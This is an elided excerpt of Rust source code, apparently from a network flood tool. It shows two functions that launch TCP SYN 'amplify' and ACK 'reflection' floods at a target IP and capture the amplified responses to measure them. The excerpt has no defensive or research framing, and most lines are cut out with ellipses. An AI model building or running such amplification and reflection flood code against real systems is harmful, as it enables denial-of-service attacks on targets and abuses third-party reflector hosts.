...
pub async fn run_tcp_amplify(
    ...
    let t_ip = target_ip;
    let shutdown_amp = Arc::clone(&shutdown);
    ...
    tokio::task::spawn_blocking(move || {
        ...
        while start.elapsed() < Duration::from_secs(duration + 10) && !shutdown_amp.load(Ordering::Relaxed) {
            match rx.next() {
                Ok(frame) => {
    ...
    run_flood_loop(
        ...
        TcpFlags::SYN, duration, delay_ms, stats, &amp_stats, "amplify", 54, shutdown,
    ).await;
...
pub async fn run_ack_reflection_amplify(
    ...
    let amp_recv = Arc::clone(&amp_stats.total_recv);
    let amp_bytes_in = Arc::clone(&amp_stats.bytes_in);
    let shutdown_ack = Arc::clone(&shutdown);
    ...
    tokio::task::spawn_blocking(move || {
        ...
        use pnet::packet::ip::IpNextHeaderProtocols;
        let start = std::time::Instant::now();
        while start.elapsed() < Duration::from_secs(duration + 10) && !shutdown_ack.load(Ordering::Relaxed) {
            match rx.next() {
                Ok(frame) => {
                    if let Some(eth) = EthernetPacket::new(&frame) {
                        if eth.get_ethertype() != pnet::packet::ethernet::EtherTypes::Ipv4 { continue; }
    ...
    run_flood_loop(
        ...
        TcpFlags::ACK, duration, delay_ms, stats, &amp_stats, "ack-reflect", 54, shutdown,
    ).await;
